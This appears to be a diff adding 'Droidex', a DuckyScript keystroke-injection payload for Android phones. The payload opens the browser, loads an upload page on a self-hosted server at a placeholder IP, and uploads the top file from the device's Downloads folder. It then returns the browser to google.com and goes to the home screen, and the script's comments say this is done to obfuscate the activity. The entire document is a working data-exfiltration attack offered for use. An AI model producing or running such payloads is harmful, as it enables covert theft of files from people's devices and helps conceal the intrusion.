@@ -1,0 +1,42 @@
+REM TITLE: Droidex
+REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
+REM TARGET OS: Android (tested on Samsung S24 FE | Android 15 | One UI 7.0)
+REM DESCRIPTION: Droidex exfiltrates the top file stored in the Downloads directory of target mobile device to a self-hosted python webserver over LAN. To function you will need a webserver hosted locally on a personal machine and corresponding webserver IP address (see ReadMe). Place the server IP address on line 6 #IPA constant.
+
+DEFINE #IPA x.x.x.x:8000/upload
+
+REM: Begin attack:
+ATTACKMODE HID
+DELAY 1000
+
+REM: Navigating to Google Search to access web browser:
+GUI f
+DELAY 600
+STRING google search
+DELAY 100
+ENTER
+DELAY 400
+DOWNARROW
+DELAY 400
+ENTER
+DELAY 400
+
+REM Navigating to upload portal and accessing files:
+STRINGLN #IPA
+DELAY 700
+TAB
+ENTER
+DELAY 600
+
+REM Selecting file:
+ENTER
+DELAY 400
+TAB
+ENTER
+
+REM Navigating browser to google.com and returning to home screen to obfuscate activity:
+DELAY 1200
+TAB
+DELAY 150
+STRINGLN google.com
+GUI h
